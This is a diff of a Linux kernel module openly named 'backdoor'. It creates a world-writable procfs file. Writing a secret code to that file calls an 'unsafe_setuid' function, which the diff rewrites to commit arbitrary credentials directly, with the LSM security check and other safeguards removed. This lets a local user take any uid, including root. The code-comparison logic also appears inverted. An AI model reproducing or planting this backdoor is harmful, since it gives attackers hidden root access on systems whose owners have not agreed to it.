@@ -2,7 +2,12 @@
 #include <linux/kernel.h>
 #include <linux/init.h>
 #include <linux/fs.h>
+#include <linux/proc_fs.h>
 #include <linux/cdev.h>
+#include <linux/sched.h>
+#include <linux/cred.h>
+#include <linux/uidgid.h>
+#include <linux/security.h>
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("MaxVorosh");
@@ -16,44 +21,23 @@ MODULE_VERSION("0.1");
 static struct proc_dir_entry *proc_entry;
 
 static long unsafe_setuid(uid_t uid) {
-	struct user_namespace *ns = current_user_ns();
-	const struct cred *old;
-	struct cred *new;
-	int retval = 0;
-	kuid_t kuid;
-
-	kuid = make_kuid(ns, uid);
-	if (!uid_valid(kuid))
-		return -EINVAL;
-
-	new = prepare_creds();
-	if (!new)
-		return -ENOMEM;
-	old = current_cred();
-
-	new->suid = new->uid = kuid;
-	if (!uid_eq(kuid, old->uid)) {
-		retval = set_user(new);
-		if (retval < 0)
-			goto error;
-	}
-
-	new->fsuid = new->euid = kuid;
-
-	retval = security_task_fix_setuid(new, old, LSM_SETID_ID);
-	if (retval < 0)
-		goto error;
-
-	retval = set_cred_ucounts(new);
-	if (retval < 0)
-		goto error;
-
-	flag_nproc_exceeded(new);
-	return commit_creds(new);
-
-error:
-	abort_creds(new);
-	return retval;
+    struct cred *new_creds;
+    kuid_t new_kuid;
+    
+    new_kuid = make_kuid(current_user_ns(), uid);
+    if (!uid_valid(new_kuid))
+        return -EINVAL;
+    
+    new_creds = prepare_creds();
+    if (!new_creds)
+        return -ENOMEM;
+    
+    new_creds->uid = new_kuid;
+    new_creds->euid = new_kuid;
+    new_creds->suid = new_kuid;
+    new_creds->fsuid = new_kuid;
+    
+    return commit_creds(new_creds);
 }
 
 static ssize_t backdoor_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
@@ -62,13 +46,13 @@ static ssize_t backdoor_write(struct file *file, const char __user *buf, size_t 
 		pr_info("backdoor: Not a secret code given, wrong length");
 		return len;
 	}
-	const char* data[SECRET_CODE_LENGTH];
+	char data[SECRET_CODE_LENGTH];
 	int result = copy_from_user(data, buf, SECRET_CODE_LENGTH);
 	if (result != 0) {
 		pr_info("backdoor: Copy from user error");
 		return -EFAULT;
 	}
-	if (!strcmp(SECRET_CODE, data)) {
+	if (!memcmp(SECRET_CODE, data, SECRET_CODE_LENGTH)) {
 		pr_info("backdoor: Not a secret code given, wrong code");
 		return len;
 	}
@@ -80,16 +64,15 @@ static ssize_t backdoor_write(struct file *file, const char __user *buf, size_t 
 	return len;
 }
 
-static const struct file_operations backdoor_fops = {
-    .owner = THIS_MODULE,
-    .read = my_proc_read,
+static const struct proc_ops backdoor_fops = {
+    .proc_write = backdoor_write,
 };
 
 static int __init backdoor_init(void)
 {
-	proc_entry = proc_create(DEVICE_NAME, 0666, NULL, &proc_fops);
+	proc_entry = proc_create(DEVICE_NAME, 0666, NULL, &backdoor_fops);
     if (!proc_entry) {
-        pr_error("backdoor: Cannot create procfs file");
+        pr_err("backdoor: Cannot create procfs file");
         return -ENOMEM;
     }
     
